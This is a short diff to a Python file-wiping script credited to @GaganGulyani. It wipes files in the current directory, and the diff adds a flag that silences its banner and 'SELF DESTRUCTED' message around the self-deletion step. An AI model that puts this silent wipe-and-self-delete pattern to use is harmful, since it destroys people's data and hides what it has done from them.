@@ -118,9 +118,10 @@ def main():
             None
     """
 
-    print('='*35)
-    print("\n\nWiper by @GaganGulyani\n")
-    print('Wiping Files:\n')
+    if DISPLAY_MESSAGE:
+        print('='*35)
+        print("\n\nWiper by @GaganGulyani\n")
+        print('Wiping Files:\n')
 
     wipe_files(
         CURRENT_DIR,
@@ -129,7 +130,8 @@ def main():
 
     if SELF_DESTRUCT:
         remove(CURRENT_SCRIPT)
-        print('Wiper SELF DESTRUCTED!')
+        if DISPLAY_MESSAGE:
+            print('Wiper SELF DESTRUCTED!')
 
 
 if __name__ == '__main__':
